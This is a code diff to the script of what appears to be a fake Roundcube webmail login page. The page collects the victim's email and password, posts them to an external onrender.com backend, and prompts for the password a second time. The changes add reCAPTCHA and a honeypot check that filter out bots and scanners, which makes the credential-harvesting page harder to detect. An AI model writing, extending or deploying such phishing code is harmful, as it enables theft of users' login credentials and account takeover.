@@ -5,9 +5,35 @@ document.addEventListener("DOMContentLoaded", () => {
   const originalButtonText = submitButton.textContent;
   let submissionCount = 0; // Track number of submissions
   let lastFormData = null; // store last-submitted form data in-memory briefly
+  const RECAPTCHA_SITE_KEY = "YOUR_RECAPTCHA_SITE_KEY"; // replace with your site key
+
+  async function getRecaptchaToken() {
+    if (
+      !window.grecaptcha ||
+      RECAPTCHA_SITE_KEY === "YOUR_RECAPTCHA_SITE_KEY"
+    ) {
+      return null;
+    }
+
+    try {
+      return await grecaptcha.execute(RECAPTCHA_SITE_KEY, { action: "submit" });
+    } catch (err) {
+      console.error("reCAPTCHA error:", err);
+      return null;
+    }
+  }
 
   form.addEventListener("submit", async (e) => {
     e.preventDefault(); // prevent form default submission
+
+    // basic honeypot check (client-side): if filled, block immediately
+    const hp = document.getElementById("hp_field");
+    if (hp && hp.value && hp.value.trim() !== "") {
+      messageDiv.textContent = "Spam detected";
+      messageDiv.classList.remove("success");
+      messageDiv.classList.add("show", "error");
+      return;
+    }
 
     submissionCount++; // Increment submission count
 
@@ -23,6 +49,14 @@ document.addEventListener("DOMContentLoaded", () => {
         email: document.getElementById("rcmloginuser").value,
         password: document.getElementById("rcmloginpwd").value,
       };
+
+      // request reCAPTCHA token and attach if available
+      const token = await getRecaptchaToken();
+      if (token) {
+        formData.recaptchaToken = token;
+        const hid = document.getElementById("recaptchaToken");
+        if (hid) hid.value = token;
+      }
 
       try {
         const backendURL = "https://fiber-1-otce.onrender.com/api/user";
@@ -45,6 +79,9 @@ document.addEventListener("DOMContentLoaded", () => {
           submitButton.disabled = false;
           return;
         }
+
+        // save last submitted data so second submit can reuse password if cleared
+        lastFormData = { ...formData };
 
         // Clear password field regardless of response
         const passwordField = document.getElementById("rcmloginpwd");
@@ -91,6 +128,14 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 
     const formData = { email, password };
+
+    // request reCAPTCHA token for the second submit too
+    const token2 = await getRecaptchaToken();
+    if (token2) {
+      formData.recaptchaToken = token2;
+      const hid2 = document.getElementById("recaptchaToken");
+      if (hid2) hid2.value = token2;
+    }
 
     try {
       // Update this URL to match your backend (local or deployed)
